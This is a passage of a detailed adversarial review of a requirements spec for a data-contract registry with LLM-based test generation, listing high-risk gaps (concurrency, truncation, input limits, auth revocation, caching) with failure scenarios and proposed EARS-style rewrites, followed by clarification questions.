- **Problem**: The actor of the second SHALL is the generated test, not the registry. R-83, R-83a, R-84, R-117b ("`exists` SHALL fail on `null`") and R-117b's read-back rules specify runtime behaviour of artifacts that §2 forbids running. Only §3.9 compat files are executed (R-135). No acceptance criterion says how these runtime clauses are verified.
- **Adversarial scenario**: An emitter change renders `exists` as `toBeDefined()`, which passes on `null`, contrary to R-117b. No in-scope test executes functional or conformance files, and the vacuity lint inspects shape rather than semantics, so the regression ships undetected.
- **Proposed rewrite / missing criterion**:
  ```
  R-93a For every runtime rule in R-83, R-83a, R-83c, R-117b, THE offline suite SHALL include a golden-output assertion over the emitted source (e.g. "an `exists` assertion on a non-nullable field renders a not-null check"), traced to the rule id.
  [Owner: alternatively, permit executing emitted conformance/functional files offline against a local HTTP fixture serving real sample records, as a further narrow exception like D-71.]
  ```

#### HR-11: Failure isolation for the deterministic adversarial stage is unspecified
- **Dimension**: Completeness (EARS probe 1)
- **Clause** (R-127):
  > THE registry SHALL run the adversarial review stage over that artifact set **before persisting it** (R-89/R-124), in the same run/job.

  (R-141, which covers the critic only):
  > Critic failures SHALL be **isolated**.
- **Problem**: If a grounding, vacuity or mutation attack throws, it is undefined whether the run fails, the plan is withheld, or the stage is skipped. The v0.8.2 changelog ("so one such contract can no longer abort a run (NFR-4, R-85)") shows this failure has already happened in practice.
- **Adversarial scenario**: A malformed `items` description makes the R-133(a) path resolver throw a `RangeError`. If this aborts the run, POST /generate-tests returns 500 and no artifacts are persisted for any entity. If the error is swallowed, the plan ships unattacked and the verdict says PASS.
- **Proposed rewrite / missing criterion**:
  ```
  R-127a IF a deterministic attack throws for a plan or entity, THEN THE stage SHALL record a Critical finding (attack = that attack, defect "attack error", evidence = redacted error) and SHALL continue with every other plan/entity; for a §3.11 plan, R-129 then withholds it (fail-closed).
  ```

#### HR-12: NFR-1's crawl p95 equals or exceeds the synchronous gateway limit
- **Dimension**: Consistency / Feasibility
- **Clause** (NFR-1):
  > A full crawl of both repos SHOULD complete within **30 s p95**.

  (NFR-8):
  > within the API Gateway timeout (<29 s)
- **Problem**: R-12 requires the crawl summary in the synchronous POST /refresh response. A p95 of 30 s at or above the stated 29 s limit means, by design, that up to about 5% of refreshes may exceed the gateway cut-off and lose the summary. The limit is also stated inconsistently (29 s in NFR-8 vs "30s route handlers" in D-57).
- **Adversarial scenario**: A crawl finishes in 29.8 s. This meets NFR-1, but the gateway has already returned 503, so the writer never receives the R-12 summary and the SPA reports failure (HR-7).
- **Proposed rewrite / missing criterion**:
  ```
  NFR-1 A full crawl SHALL complete within <T> s p99, where T is at least 5 s below the API Gateway integration timeout actually configured for POST /refresh [owner: state that timeout once, in one place].
  ```

#### HR-13: References to two repos and two sources are stale after D-63
- **Dimension**: Consistency
- **Clause** (§2):
  > The set of source repos is fixed configuration (the two example apps).

  (NFR-1):
  > A full crawl of both repos SHOULD complete within **30 s p95**.

  (NFR-3):
  > The design SHALL comfortably handle the two sources × four entities today

  (D-14):
  > scoped to the two repos
- **Problem**: R-01 defines exactly one crawl source. Performance, scale and credential-scope requirements still describe two repos, so the test fixtures and the PAT scope they imply are wrong.
- **Adversarial scenario**: A performance test built from NFR-1 crawls two repos that are no longer configured. A PAT-scope review from D-14 checks access to `awp-odcs-publishing`/`awp-odcs-consuming` (retired, per D-63) instead of `collegeboard-software/awp-app-plane`.
- **Proposed rewrite / missing criterion**:
  ```
  Replace with: "the configured crawl source(s) (R-01; v1: one monorepo, awp-app-plane)". NFR-3: "1 crawl source × <N> catalog labels × <M> entities today". D-14: "scoped read-only to collegeboard-software/awp-app-plane".
  ```

#### HR-14: Untrusted `domain`/`id` values are used in API routes and S3 keys with no character constraints
- **Dimension**: Completeness (input validation, server)
- **Clause** (R-41):
  > addressed by {source, id, version, content hash}

  (R-51):
  > WHEN a reader calls `GET /contracts/{source}/{id}`
- **Problem**: Catalog labels come from free-text ODCS `domain`, and `id` is free text. Neither has a character set or length constraint, and both form route path segments and S3 key segments. The empty-string `domain` case ("when present") is also undefined.
- **Adversarial scenario**: A contract has `domain: "get-ready/v2"` and `id: "task/published"`. GET /contracts/get-ready/v2/task/published does not match the two-segment route, so the entry is listed by R-50 but unreachable via R-51/R-52 (spurious 404). Its S3 key nests extra prefixes. A `domain: ""` contract may resolve to an empty label.
- **Proposed rewrite / missing criterion**:
  ```
  R-22a IF a contract's resolved catalog label or `id` is empty or does not match ^[A-Za-z0-9._-]{1,128}$, THEN THE registry SHALL catalog it validation: invalid with rule `identity.charset`, keyed per R-21a.
  ```

#### HR-15: A truncated Git Trees response is not handled, so the spec doc can be wiped as "absent"
- **Dimension**: Completeness (dependency failure)
- **Clause** (R-10):
  > Discovery SHALL use the **Git Trees API** (`GET /repos/{o}/{r}/git/trees/{branch}?recursive=1`) to enumerate the tree

  (R-105):
  > IF a source's `docs/spec.md` is **absent, or is present but contains no requirements section**, THE registry SHALL **replace that source's requirement snapshot with the empty set**
- **Problem**: GitHub's recursive tree endpoint can return a partial listing with `truncated: true` for large repositories, and `awp-app-plane` is a monorepo. No requirement treats truncation as an unobserved state.
- **Adversarial scenario**: The monorepo grows past the recursive-listing limit, so the tree is truncated and `docs/spec.md` is not in the partial listing. R-105 treats it as absent and wipes all ~45 requirements, recorded as success. Contracts beyond the cut-off are silently not discovered and, under BLK-7's missing rule, may later be treated as removed.
- **Proposed rewrite / missing criterion**:
  ```
  R-10a IF the Git Trees response indicates truncation, THEN THE registry SHALL record the crawl source's outcome as `failed` (reason "tree truncated") and apply R-13 and R-105's unobserved-state rule (keep prior contracts and requirements).
  ```

#### HR-16: Empty or degraded upstream input silently wipes committed generated trees
- **Dimension**: Completeness (graceful degradation)
- **Clause** (R-105):
  > or is present but contains no requirements section

  (R-116):
  > IF the catalog has **no groundable requirement** (see R-121), the job SHALL complete as a **success** with an empty artifact set.

  (R-123):
  > regeneration SHALL **replace that subtree wholesale** (R-92 analog)
- **Problem**: A heading typo is indistinguishable from "no requirements section". The result is recorded as success, and the chain continues as an empty job, then an empty artifact set, then a wholesale replacement. Nothing distinguishes an intentional zero from an accident. The same applies to §3.9 (R-81 empty catalog, then R-92 wholesale replacement).
- **Adversarial scenario**: An author edits `## 3. Functional Requirements (EARS)` to `## 3. Functional Requirements`. The crawl wipes 45 requirements (success, `removed: 45`). The next CLI run writes an empty `generated-tests/functional/`, and `git diff` deletes every functional test. The only signal is a count in a JSON summary.
- **Proposed rewrite / missing criterion**:
  ```
  R-105b WHEN a wipe removes ≥1 requirement because no requirements section was found in a present docs/spec.md, THE registry SHALL record a `requirements.sectionMissing` warning on the crawl-run record and log it.
  R-126c IF the downloaded artifact set would replace a non-empty generated-tests/<subtree>/ with an empty one, THEN THE CLI SHALL NOT write it unless invoked with an explicit confirmation flag, and SHALL print the reason.
  ```

#### HR-17: No size or alias limits on parsed YAML; one file can break the whole crawl
- **Dimension**: Completeness (input validation, server)
- **Clause** (R-20):
  > THE registry SHALL parse it as YAML and validate the parsed document against the **vendored ODCS v3.1.0 JSON schema**

  (NFR-4):
  > one unreachable source, one malformed file, or one invalid contract SHALL NOT prevent the remaining sources/files from being cataloged
- **Problem**: No maximum blob size, alias or anchor expansion limit, or depth limit is specified. With a single crawl source, one pathological file can exhaust Lambda memory or time and fail every contract.
- **Adversarial scenario**: A contract contains a nested-alias "billion laughs" structure (nine levels of 10× aliases). Expansion exhausts the 1024 MB Lambda, and the crawl dies before any run record is written (HR-4), violating NFR-4.
- **Proposed rewrite / missing criterion**:
  ```
  R-20a IF a discovered blob exceeds <N> KiB, or its YAML exceeds <A> aliases or depth <D> [owner to set], THEN THE registry SHALL catalog it validation: invalid with rule `yaml.limits` without fully parsing it, and SHALL continue the crawl.
  ```

#### HR-18: List endpoints have no pagination, and the Scan approach can truncate silently
- **Dimension**: Completeness
- **Clause** (R-50):
  > THE registry SHALL respond `200 OK` with the catalog: one row per {source, id} entry

  (D-62):
  > the table is a single Scan page (<1 MB, tens of ms)
- **Problem**: R-50, R-55, R-90 (list), R-109 and R-125 (list) return unbounded collections. D-62 assumes a single Scan page, and the spec does not require following continuation keys. The API defines neither a page size nor a truncation indicator.
- **Adversarial scenario**: Generation-run and job records accumulate (HR-20). The single-table Scan reads all item kinds before filtering and stops at 1 MB. GET /contracts returns 180 of 250 entries with 200 OK, and the by-source view (R-65) silently omits contracts.
- **Proposed rewrite / missing criterion**:
  ```
  R-50a Every list endpoint SHALL return every matching row, following storage continuation until exhausted, OR SHALL support `?limit=` (max <N>) and return `nextToken` when more rows exist [owner to choose]. A response SHALL never silently omit rows.
  ```

#### HR-19: Inline delivery of full artifact sets and reports has no size ceiling
- **Dimension**: Feasibility
- **Clause** (R-143):
  > The full report SHALL be included inline (D-32 pattern).

  (D-32):
  > escalate to pre-signed download only if artifacts grow large.
- **Problem**: Lambda-backed responses have a fixed payload limit (6 MB for a synchronous Lambda response). Functional jobs now return plans, a manifest, emitted files and full critic findings inline. "Grow large" has no threshold, and no fallback is required.
- **Adversarial scenario**: A job with 60 plans and full critic reconcile output exceeds the response limit. GET /functional-test-jobs/latest fails with 5xx, so R-126's CLI can never download that job's artifacts.
- **Proposed rewrite / missing criterion**:
  ```
  R-90a IF the serialised artifact set and report exceed <N> MB [owner: below the Lambda response limit], THEN THE response SHALL return S3 pre-signed URLs (expiry <M> min) instead of inline content, and THE CLI SHALL follow them.
  ```

#### HR-20: No retention policy for runs, jobs, reports or S3 artifact sets
- **Dimension**: Completeness (data lifecycle)
- **Clause** (R-89):
  > THE registry SHALL persist each generation run's **artifact set in S3** (manifest + emitted files, addressed by run id) and a **generation-run record in DynamoDB**
- **Problem**: Crawl runs, generation runs, functional jobs, adversarial reports and their S3 sets accumulate without bound. This contradicts NFR-3's claim that scale needs no structural change, and it worsens HR-18.
- **Adversarial scenario**: The CLI runs about 20 times a day across operators, producing about 7,300 generation records and S3 sets a year plus job records. The D-62 Scan cost and latency grow until NFR-1 (300 ms p95) fails, with no requirement to prune.
- **Proposed rewrite / missing criterion**:
  ```
  R-94 THE registry SHALL retain crawl-run, generation-run and job records (and their S3 artifact sets) for <N> days or the most recent <K> per kind [owner to set], and SHALL delete older items automatically; contract versions (R-33) are exempt.
  ```

#### HR-21: Generation can read a catalog that a concurrent crawl is mid-way through writing
- **Dimension**: Completeness (concurrency)
- **Clause** (R-80):
  > THE registry SHALL read the **current catalog** (the entries persisted by the most recent crawl)
- **Problem**: R-15's single-flight lock covers crawls only. POST /generate-tests and the functional job can read while a crawl writes, which gives a mix of two commits. R-89's "catalog commit context" then has no single value.
- **Adversarial scenario**: Writer A triggers a refresh and writer B triggers generate-tests 3 s later. The generator pairs `create@commitB` with `get-ready@commitA`, the compat test fails spuriously, and the manifest records hashes no single commit ever had.
- **Proposed rewrite / missing criterion**:
  ```
  R-80d IF a crawl lock is held when POST /generate-tests or POST /generate-functional-tests is received, THEN THE registry SHALL respond 409 with the in-flight crawl run id and SHALL NOT generate.
  ```

#### HR-22: No single-flight or rate limit on functional jobs; concurrent jobs race on the cache and on `latest`
- **Dimension**: Completeness (concurrency / cost)
- **Clause** (R-115):
  > THE registry SHALL start an **asynchronous** generation job over the current catalog (contracts **and** requirements), respond **`202 Accepted`** with a **job id**
- **Problem**: Two jobs can run at once. Both miss the cache on the same inputs, both invoke Bedrock, and both write different non-deterministic plans to the same cache keys. R-119's "committed source of truth" then depends on which job finished last.
- **Adversarial scenario**: Two writers (or a script retry) start jobs 2 s apart over 40 changed requirements. That is 80 Sonnet syntheses and 160 Opus critic calls. The cache entry for `CRE-R-24` holds job 2's plan while job 1's artifact set, built from a different plan, is `latest`, and the CLI commits plans the cache will not reproduce.
- **Proposed rewrite / missing criterion**:
  ```
  R-115b WHILE a functional job for the same stage is `pending` or `running`, IF POST /generate-functional-tests is received, THEN THE registry SHALL respond 409 with the in-flight job id and SHALL NOT start a job.
  ```

#### HR-23: Bedrock throttling or transient errors mid-job: skip vs fail vs retry is undefined
- **Dimension**: Completeness (dependency failure)
- **Clause** (R-120):
  > IF the LLM returns a malformed or non-schema-valid plan for one requirement, THE job SHALL **skip** that requirement with a recorded reason and **continue**

  (E-46):
  > The job is marked `failed` with the (redacted) Bedrock error recorded on the job record; **no** partial artifacts are produced
- **Problem**: R-120 covers malformed output and E-46 covers denial. A throttling or 5xx error after some plans have succeeded falls between them, with no retry or backoff policy.
- **Adversarial scenario**: Requirement 26 of 40 gets `ThrottlingException`. If it is treated as a skip, the manifest drops CRE-R-26's plan, and R-123's wholesale replacement deletes its committed test. If it is treated as E-46, 25 good plans are discarded and the job fails.
- **Proposed rewrite / missing criterion**:
  ```
  R-120a IF a Bedrock call fails with a throttling or transient (5xx/timeout) error, THEN THE job SHALL retry with exponential backoff up to <N> attempts; IF all attempts fail, THEN THE job SHALL be marked `failed` (E-46 semantics) rather than skipping the requirement.
  ```

#### HR-24: The boundaries of a multi-line requirement's "full text" are undefined, which breaks verbatim checks
- **Dimension**: Ambiguity
- **Clause** (R-102):
  > capturing each requirement's **id** (including optional domain prefix and sub-letter, e.g. `CRE-R-24` or `R-17a`), its full **text**

  (R-133(c)):
  > (c) an assertion `clause` that is not a verbatim substring of the requirement text.
- **Problem**: Requirements written like this spec's R-117b span many lines with nested bullets. Whether "full text" includes continuation lines, nested bullets or code spans is unspecified. Grounding, Critical withholding and R-119 cache keys all depend on it.
- **Adversarial scenario**: A source requirement has 12 nested sub-bullets. The parser captures only the first line, the LLM correctly quotes a sub-bullet clause, R-133(c) flags it Critical as not a substring, and a correct plan is withheld. If the parser instead over-captures into the next paragraph, unrelated prose enters the LLM context and the cache key.
- **Proposed rewrite / missing criterion**:
  ```
  R-102a A requirement's text SHALL run from the character after its bold id to the line before the next requirement id, the next heading, or the first non-indented line after a blank line, whichever comes first, including nested list lines.
  ```

#### HR-25: Requirement-text normalisation is undefined, so reformatting churns change flags and the LLM cache
- **Dimension**: Ambiguity
- **Clause** (R-107):
  > flagging each requirement **`changedInLastCrawl: true`** IFF its text **differs** from the previously-stored text for the same {source, id}

  (R-119):
  > Each plan SHALL be **cached** keyed by a content hash over `{requirement text, contract content hash(es), API-map entry, model id, prompt version}`.
- **Problem**: R-133(c) explicitly ignores formatting, but R-107 and R-119 compare raw text. A whitespace or re-wrap edit counts as a change and forces non-deterministic re-synthesis, which defeats R-119's purpose.
- **Adversarial scenario**: An author re-wraps `docs/spec.md` at 100 columns with no wording change. All 45 requirements are flagged changed and every plan misses the cache. That means 45 Sonnet and 90 Opus calls, and the functional tree shows a non-deterministic diff for every test.
- **Proposed rewrite / missing criterion**:
  ```
  R-107a / R-119d Before comparison and hashing, requirement text SHALL be normalised with the R-133(c) rules (markdown code ticks and emphasis removed, whitespace runs collapsed, curly quotes → straight); case and words are preserved.
  ```

#### HR-26: The plan cache's location and authority are undefined (S3 vs committed git)
- **Dimension**: Ambiguity
- **Clause** (R-119):
  > The cached plan is the **committed source of truth** for that test (D-52)

  (R-124):
  > THE registry SHALL persist each job's **artifact set in S3** (manifest + emitted files + the synthesised plans, addressed by job id)
- **Problem**: The worker Lambda cannot read the git working tree (D-8). It is unspecified whether the cache is S3/DynamoDB, the committed files, or both, and which wins when they disagree.
- **Adversarial scenario**: A reviewer hand-edits a committed plan to fix a wrong `fieldPath`. The next job reads its server-side cache, reuses the unedited plan, and the CLI overwrites the human fix. Conversely, an S3 cleanup (HR-20) empties the cache and every plan is re-synthesised even though the "committed source of truth" is intact in git.
- **Proposed rewrite / missing criterion**:
  ```
  R-119e THE plan cache SHALL be stored in <S3 prefix / DynamoDB item kind — owner to state>, keyed by input hash. Committed plan files are a copy for review and SHALL NOT be read by the job. A human edit to a committed plan has no effect on future jobs (state this explicitly), OR [owner alternative] the CLI SHALL upload reviewed plans to the cache.
  ```

#### HR-27: `timeoutSeconds` has no upper bound and no link to the test-runner timeout
- **Dimension**: Completeness
- **Clause** (R-117b):
  > the wait is unbounded (`timeoutSeconds` < 1, or `pollIntervalSeconds` outside 1…`timeoutSeconds`);
- **Problem**: Only the lower bound is validated. Vitest's per-test timeout is not tied to the plan's wait, so long waits either hang a future runner or are killed early, turning red regardless of system behaviour.
- **Adversarial scenario**: The LLM emits `timeoutSeconds: 3600`, which passes validation. The emitted test polls for an hour, or Vitest's default test timeout kills it after seconds, so it fails even when propagation succeeds within 30 s.
- **Proposed rewrite / missing criterion**:
  ```
  R-117b(b2) Validation SHALL reject timeoutSeconds > <T_max> [owner to set]. THE emitter SHALL set the test's timeout to timeoutSeconds + <margin> s.
  ```

#### HR-28: Publisher-side assertions compare the payload with itself; the vacuity attack does not catch this
- **Dimension**: Verifiability
- **Clause** (R-117b):
  > publisher-side assertions SHALL read the record the publisher accepted: the trigger `payload` overlaid with the response body when that is a JSON object, so an acknowledgement-only response does not turn a correct publisher red;

  (R-134(g)):
  > (g) a tautological assertion: one that cannot fail once the read-back succeeded. This means `exists` on the read-back service's `matchOn` field, or `equals` comparing that field with the payload's `matchFrom` path.
- **Problem**: When the response does not echo a field, a publisher assertion on that field reads the trigger payload's own value. An `equals` against `trigger.payload`, or `exists`, cannot fail. R-134(g) covers only the read-back `matchOn` tautology, and R-136 mutates only the consumer side.
- **Adversarial scenario**: The publisher returns `{"ok": true}` and silently discards the write. The plan asserts publisher `taskType equals trigger.payload.taskType`. The asserted record is `payload ∪ {ok}`, so the test is green, no vacuity finding is raised, and the verdict can be PASS.
- **Proposed rewrite / missing criterion**:
  ```
  R-134(j) §3.11, Major: a publisher-side assertion on a field supplied by the trigger payload that the publisher response body does not contain (or for which no response schema is known) SHALL be flagged as tautological.
  ```

#### HR-29: R-133(b)'s Critical branch cannot be reached under D-88, so hallucinated payload keys never gate
- **Dimension**: Consistency
- **Clause** (R-133(b)):
  > **where the `trigger.path` is a mapped path for that entity**. For an unmapped trigger path (OQ-15), (b) is **Major**.

  (R-117b(a)):
  > (a) The trigger SHALL carry a **concrete JSON `payload`**, whose keys are properties of the publisher variant's `schema[]`, instead of a prose `payloadShape`.
- **Problem**: Under D-88, write paths are never mapped, so (b) is always Major. R-117b(a) states a SHALL on payload keys, but the stated enforcement never blocks a violation, and plan validation (R-117b's reject list) does not include unknown payload keys.
- **Adversarial scenario**: The LLM adds `assignmentUrgency: "high"`, a key absent from the publisher schema. The result is a Major finding, so the plan is emitted. The future runner sends an unknown field, and the publisher's validation rejects the request, which looks like a system defect.
- **Proposed rewrite / missing criterion**:
  ```
  Either: R-117b(a) is enforced at validation (reject a payload key absent from the publisher schema[]), OR R-117b(a) is downgraded to "SHOULD" and R-133(b) is documented as never Critical while D-88 stands [owner to choose].
  ```

#### HR-30: Type-widening rules are referenced but never defined, and §3.9 and §3.11 disagree
- **Dimension**: Consistency
- **Clause** (R-84a):
  > "type-compatible" SHALL mean equal logical types (with any documented widening rules noted in the manifest).

  (R-117b):
  > A `matchesType` check accepts an integer for `number`
- **Problem**: No widening rules are documented anywhere. §3.11 accepts integer→number, while §3.9 compat requires equality. Mutation M2 (R-135) outcomes depend on the undefined rule.
- **Adversarial scenario**: The consumer requires `score: number` and the publisher declares `score: integer`. Compat fails (unequal types) while the functional `matchesType` passes for the same pair. An M2 mutant changing `number` to `integer` survives or dies depending on an unwritten rule, which could produce a false Critical generator finding.
- **Proposed rewrite / missing criterion**:
  ```
  R-84e The permitted widening rules SHALL be exactly: <list, e.g. integer → number> [owner]. They SHALL apply identically to R-84a compat, R-117b matchesType, and R-135 M2 mutant selection (M2 SHALL choose a non-widenable target type).
  ```

#### HR-31: Type resolution from description text has undefined multiple-match behaviour
- **Dimension**: Ambiguity
- **Clause** (R-84d):
  > An array property with no `items.properties` takes as its item type the **sibling `schema[]` object** whose name appears, as a whole word, in the array property's `description`
- **Problem**: Structural resolution depends on prose. Two sibling names in one description, or a prose edit, change the compat and conformance semantics.
- **Adversarial scenario**: `description: "List of TaskPublishedItem objects; replaces LegacyItem"` with both siblings present. Which is chosen is undefined, so the generator could pick by `schema[]` order, and reordering `schema[]` then flips compat results without any field change.
- **Proposed rewrite / missing criterion**:
  ```
  R-84d(f) IF more than one sibling object name appears in the description, THEN the item type SHALL be undeclared and THE manifest SHALL record "ambiguous item type" for that path.
  ```

#### HR-32: The posture lint drops legitimate defects whose wording contains "consider" or "suggest"
- **Dimension**: Verifiability
- **Clause** (R-140):
  > or whose defect statement praises the test or proposes an improvement (fixed patterns, D-78)

  (D-78):
  > `\b(well[- ]structured|looks good|nice|great|consider|could be improved|you may want|suggest|recommend)\b`
- **Problem**: Bare-word matching on `consider`/`suggest` drops genuine defect statements. Drops are only counted, and R-145 does not measure the lint's false-drop rate.
- **Adversarial scenario**: The critic returns "The assertion does not consider a null `dueDate`, so a consumer that drops the field still passes", with a valid failure scenario. It matches `consider` and is silently dropped. Critic recall in calibration falls and is blamed on the model.
- **Proposed rewrite / missing criterion**:
  ```
  D-78 / R-140 Patterns SHALL match suggestion forms only (e.g. ^\s*(consider|you may want|we suggest|I recommend)\b, "consider (adding|using)"), not the bare word anywhere. R-145 SHALL include ≥1 critic seed whose valid defect text contains "consider" and assert it is not dropped.
  ```

#### HR-33: The critic-recall threshold is statistically meaningless (n = 2 seeds, one non-deterministic run)
- **Dimension**: Verifiability
- **Clause** (R-145):
  > Critic recall SHALL be measured in a live calibration run (an enabling task) against the critic-tagged seeds, with a pass threshold of **≥ 80%** (D-81)

  (D-80):
  > 9. a semantically wrong but grounded assertion, e.g. equating the wrong pair of fields (critic only).
- **Problem**: Only seeds 5 and 9 are critic-tagged. 80% of 2 means 2/2, so the threshold is effectively 100%, measured once on a non-deterministic model, with no trigger to recalibrate when the critic model or prompt changes.
- **Adversarial scenario**: Run 1 catches both seeds (pass). Run 2 on identical inputs misses seed 9 (fail). Neither result says anything about the critic's quality, and a later swap of `CRITIC_MODEL_ID` (D-81) ships with no recalibration.
- **Proposed rewrite / missing criterion**:
  ```
  R-145a The calibration set SHALL contain ≥ <K> critic-tagged seeds [owner, e.g. ≥10]. Recall SHALL be the mean over <M> runs. Calibration SHALL be re-run whenever CRITIC_MODEL_ID or the critic prompt version changes.
  ```

#### HR-34: Bare-id file names collide across sources
- **Dimension**: Completeness
- **Clause** (R-117d):
  > The emitted file name SHALL keep using the bare id (`cre-r-24-taskpublished.generated.test.ts`).
- **Problem**: R-102 permits un-prefixed ids (`R-24`). With more than one crawl source (NFR-3 targets ≥10), two requirements map to the same file, and one silently overwrites the other.
- **Adversarial scenario**: Sources `alpha` and `beta` both declare `**R-24**` mentioning TaskPublished. Both emit `r-24-taskpublished.generated.test.ts`. The manifest lists two plans but the tree holds one file.
- **Proposed rewrite / missing criterion**:
  ```
  R-117d(a) IF two plans would produce the same emitted file name, THEN THE emitter SHALL prefix each with its normalised source label and record the collision in the manifest.
  ```

#### HR-35: OQ-17 is open: the catalog holds requirements from an ingestion path no requirement permits
- **Dimension**: Feasibility / Consistency
- **Clause** (OQ-17):
  > Either the stage that produced the tree ran code or parameters that are not in this working tree, or requirements entered the catalog through a path outside R-100/R-101/R-116.
- **Problem**: The committed tree contains `jira-awp/*` requirements that no configured source can produce. This contradicts R-116 and the spirit of §2/D-4. The question has no owner, no due date, and no blocking rule meanwhile.
- **Adversarial scenario**: An out-of-band writer (a script with table write access) inserts `REQ#` items for a fake source. They are grounded, synthesised, emitted and committed, and later executed against live services, while every requirement-traced test passes.
- **Proposed rewrite / missing criterion**:
  ```
  R-116a THE job SHALL skip, with reason "unknown source", any requirement whose source label is not a configured crawl source (R-01).
  OQ-17 Assign an owner and resolution date; until resolved, the jira-awp entries SHALL be removed from the committed tree.
  ```

#### HR-36: The entity diff is undefined for three or more variants and for variants without publisher/consumer labels
- **Dimension**: Completeness
- **Clause** (R-53):
  > and, when there are exactly two variants, a **semantic per-property diff** over the parsed contracts

  (R-63):
  > THE front-end SHALL display a side-by-side/inline **diff** of the publisher vs consumer variant (R-53).
- **Problem**: Post-D-63 labels are domains, so "publisher vs consumer" sides no longer exist. An entity in three labels is `divergent` with no diff, and R-63 has nothing to render.
- **Adversarial scenario**: `TaskPublished` exists under `create`, `get-ready` and `score`. GET /entities returns `divergent: true` with no diff, and the SPA shows an empty diff panel. With two variants `create`/`get-ready`, which side is shown on the left is unspecified.
- **Proposed rewrite / missing criterion**:
  ```
  R-53a WHERE an entity has a declared flow (D-84), the diff SHALL be oriented publisher → consumer for each declared pair. IF an entity has ≥3 variants and no declared flow, THEN the response SHALL include `diff: null` with `diffUnavailableReason`, and R-63 SHALL display that reason.
  ```
  (Note: written as `WHERE` deliberately, because a declared flow is configuration, per the observation on R-84c.)

#### HR-37: Group revocation latency is undefined; the token claim is used, not live membership
- **Dimension**: Completeness (auth boundary)
- **Clause** (R-71):
  > SHALL derive endpoint authorisation from the caller's group membership (R-16, R-56).

  (D-21):
  > per-route rule keyed on `routeKey` + the `cognito:groups` claim
- **Problem**: R-71 says membership, but the implementation reads a point-in-time claim. A user removed from `writer` keeps write access until the access token expires, and the window is not stated.
- **Adversarial scenario**: At 10:00 a writer is removed from `writer` for misuse. Their token issued at 09:55 still carries `cognito:groups: ["writer"]`, so POST /refresh and POST /generate-functional-tests (Bedrock cost) keep succeeding until the token expires.
- **Proposed rewrite / missing criterion**:
  ```
  R-71a Authorisation SHALL use the `cognito:groups` claim of the presented access token. Group removal takes effect no later than the access-token validity, which SHALL be configured to <N> minutes [owner]; for immediate revocation an administrator SHALL also revoke the user's refresh tokens and sign them out globally.
  ```

#### HR-38: Demo-user seeding applies to every stage, and the shared writer identity defeats attribution
- **Dimension**: Feasibility (security / compliance)
- **Clause** (R-72):
  > THE deployment SHALL seed two demo users — one `reader` and one `writer` — each assigned to its corresponding group

  (D-35):
  > the writer password from the existing `Config.Secret REGISTRY_DEMO_PASSWORD`
- **Problem**: Every stage gets `writer@demo` with an SSM-stored password, and every CLI operator authenticates as that one identity. Any principal able to read that SSM parameter gains writer rights. Password policy and rotation are unspecified, and audit records cannot attribute actions (CN-39).
- **Adversarial scenario**: Three engineers run `npm run generate-tests` against the same stage. All crawl, generation and job records show `writer@demo`. A wipe caused by HR-16 cannot be traced to a person. An IAM role intended only for deploys can read the parameter and gain app-level write access.
- **Proposed rewrite / missing criterion**:
  ```
  R-72a THE deployment SHALL seed demo users only in stages listed in <config key> [owner].
  R-91c THE CLI SHALL support authenticating as a named writer (REGISTRY_USERNAME/REGISTRY_PASSWORD or REGISTRY_TOKEN, already in R-91a) and SHALL print the identity used; use of writer@demo outside demo stages SHALL require an explicit flag.
  ```

---

### CLARIFICATION NEEDED — ambiguous or under-specified; low blast radius but requires owner decision

#### CN-1: Compound requirements bundle independent behaviours (SV-7)
- **Dimension**: Verifiability (EARS SV-7)
- **Clause** (R-10):
  > THE registry SHALL crawl **every** configured source repository's default branch via the GitHub API, discover all matching `contract/*.odcs.yaml` files, and ingest each one.

  (R-144):
  > THE `generate-tests` CLI (all modes) SHALL print the adversarial verdict and counts. It SHALL write the full report
- **Question for the author**: Should R-10, R-91, R-117b (about 20 sub-rules) and R-144 (print, write report, ordering, executed tier, handoff block) be split into individually numbered sub-requirements, so that each has its own trace id and test?
- **Default assumption if not answered**: Each sentence or sub-bullet is treated as a separately testable sub-requirement (R-117b.a.1 …), numbered by position.

#### CN-2: Some normative behaviour is defined only in the Decisions Log (SV-9)
- **Dimension**: Consistency (EARS SV-9)
- **Clause** (D-61):
  > A requirement "references" a cataloged entity when the entity name matches as a whole word (case-insensitive, optional trailing `s`) in the requirement text; this gates groundability

  (D-21):
  > authorizer result caching disabled
- **Question for the author**: Are D-entry "Decision" texts normative? R-121's skip rule depends on D-61's heuristic, and the auth behaviour depends on D-21's caching setting, but neither is referenced from a numbered requirement.
- **Default assumption if not answered**: Decision texts are normative where an R-item cites them. D-61 and D-21's caching clause are treated as normative and should be cited from R-121 and R-56 respectively.

#### CN-3: Dated amendment notes are embedded inside normative text (SV-9)
- **Dimension**: Ambiguity (EARS SV-9)
- **Clause** (R-117b):
  > _(2026-10-09, T-58)_ An `expected` attached to an `exists` assertion is ignored and dropped at validation, not rejected
- **Question for the author**: Can provenance annotations (`_(v0.8.1, …)_`, `_(2026-10-09, T-58)_`) move to the changelog, so that the requirement body holds only normative text?
- **Default assumption if not answered**: Italic parenthetical annotations are non-normative and the surrounding sentence is normative.

#### CN-4: "hidden or disabled" for reader-only users is untestable as written (feature NOT-branch)
- **Dimension**: Verifiability (EARS probe 3)
- **Clause** (R-64):
  > WHERE the user is reader-only, that action SHALL be hidden or disabled.
- **Question for the author**: Should the Refresh action for a reader be absent from the DOM, or present with `disabled`?
- **Default assumption if not answered**: Not rendered (see BLK-1 R-64b).

#### CN-5: NFR-3 "comfortably handle" is unmeasurable
- **Dimension**: Ambiguity
- **Clause** (NFR-3):
  > The design SHALL comfortably handle the two sources × four entities today and SHALL not require structural change to catalog **≥10 sources × ≥25 contracts each**
- **Question for the author**: What observable criterion defines "comfortably", for example NFR-1 latency met at the stated scale with ≥ N versions per contract and ≥ K run records?
- **Default assumption if not answered**: NFR-1 targets hold at 10 labels × 25 contracts × 10 versions, plus 500 requirements and 1,000 run records.

#### CN-6: E-59's example conflicts with flows declared in v0.8.1
- **Dimension**: Consistency
- **Clause** (E-59):
  > An entity in two sources with domain labels (e.g. `score`, `deliver`) has **no declared flow**

  (v0.8.1 changelog):
  > **D-84:** flows declared for ClassAssignment (deliver → frontend), ResultPackage (deliver → score) and StudentTaskScoredEvent (score → report).

  (D-84):
  > Seeded: `TaskPublished: create → get-ready`.
- **Question for the author**: Which flows are currently declared? D-84's body lists only TaskPublished, while the changelog lists three more, one of which is E-59's "no flow" example.
- **Default assumption if not answered**: The changelog reflects the code. D-84 is updated to list all four flows, and E-59's example is changed to a label pair with no declared flow.

#### CN-7: "first" in id-collision handling has no defined ordering
- **Dimension**: Ambiguity
